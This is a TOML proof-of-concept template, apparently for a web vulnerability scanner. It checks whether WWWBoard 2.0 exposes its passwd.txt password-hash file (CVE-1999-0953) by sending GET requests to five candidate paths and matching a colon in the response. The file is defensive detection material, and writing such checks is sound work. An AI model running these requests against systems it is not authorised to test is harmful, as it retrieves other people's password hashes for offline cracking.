[info]
author = "ave"
description = "检测 WWWBoard 2.0 是否将加密密码文件 passwd.txt 暴露在 Web 根目录下。远程攻击者无需认证即可通过 HTTP GET 请求直接访问该文件，获取所有用户的加密密码哈希，进而可离线破解获取明文密码。"
id = "POC-AVE-1999-1500"
name = "WWWBoard 2.0 passwd.txt Remote Password Disclosure PoC"
severity = "critical"
tags = ["ave-1999-1500"]
vuln_id = [
    "CVE-1999-0953",
    "AVE-1999-1500",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/wwwboard/passwd.txt"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [":"]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/wwwboard/passwd.txt"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [":"]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/wwwboard/password.txt"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [":"]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/passwd.txt"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [":"]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/board/passwd.txt"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [":"]
